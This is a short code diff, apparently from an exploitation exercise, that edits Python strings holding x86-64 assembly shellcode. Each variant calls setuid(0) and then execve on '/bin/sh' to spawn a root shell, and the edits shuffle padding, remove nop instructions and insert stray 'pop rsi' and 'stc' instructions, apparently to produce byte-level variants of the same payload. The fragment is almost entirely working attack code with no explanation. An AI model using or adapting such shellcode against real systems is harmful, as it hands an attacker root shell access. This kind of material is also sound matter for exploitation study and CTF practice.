@@ -34,11 +34,13 @@ push 0
 pop rdi
 push 105
 pop rax
+
+
 syscall 
-
-
 mov rax, 59     
 lea rdi, [rip+binsh]    
+
+
 mov rsi, 0      
 mov rdx, 0  
 syscall         
@@ -47,26 +49,22 @@ binsh:
 '''
 
 shellcode_3 = '''
-
 push 0
 pop rdi
 push 105
 pop rax
-nop
-nop
 syscall
 
 
 mov rax, 59
-nop
-nop
-nop
-nop
-nop
 lea rdi, [rip+binsh]
+pop rsi
+
 mov rsi, 0
 mov rdx, 0
 syscall
+stc
+stc
 binsh:
 .string "/bin/sh"
 '''
